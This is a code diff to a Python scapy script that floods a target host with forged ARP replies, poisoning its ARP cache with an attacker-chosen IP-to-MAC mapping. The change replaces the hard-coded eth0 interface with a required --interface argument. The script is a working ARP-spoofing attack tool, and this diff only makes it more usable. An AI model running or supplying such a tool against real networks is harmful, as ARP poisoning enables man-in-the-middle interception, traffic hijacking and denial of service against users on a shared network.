@@ -3,9 +3,9 @@
 import os, sys, time, argparse
 from scapy.all import Ether, ARP, get_if_hwaddr, get_if_addr, sendp
 
-def buildARPReply(tip, tmac, host):
-    srcip = get_if_addr('eth0')
-    srchw = get_if_hwaddr('eth0')
+def buildARPReply(tip, tmac, host, iface='eth0'):
+    srcip = get_if_addr(iface)
+    srchw = get_if_hwaddr(iface)
 
     ether = Ether(src=srchw, dst=host)
     arp = ARP(
@@ -24,6 +24,7 @@ def main():
     parser.add_argument("--target-ip", help="Target logical address in ARP reply", type=str, action='store', required=True)
     parser.add_argument("--target-mac", help="Target physical address in ARP reply", type=str, action='store', required=True)
     parser.add_argument("--host", help="Host", type=str, action='store', required=True)
+    parser.add_argument("--interface", help="Network interface", type=str, action='store', required=True)
     parser.add_argument("--count", help="Packet number", type=int, action='store', default=10, required=False)
     args = parser.parse_args()
 
@@ -31,14 +32,15 @@ def main():
     tip = args.target_ip
     tmac = args.target_mac
     cnt = args.count
+    iface = args.interface 
 
     print("Poisoning target host %s with entry (%s => %s)..." % (host, tip, tmac))
     try:
         while True:
             if cnt == 0:
                 break
-            packet = buildARPReply(tip, tmac, host)
-            sendp(packet, iface="eth0")
+            packet = buildARPReply(tip, tmac, host, iface=iface)
+            sendp(packet, iface=iface)
             time.sleep(0.5)
             cnt -= 1
     except KeyboardInterrupt:
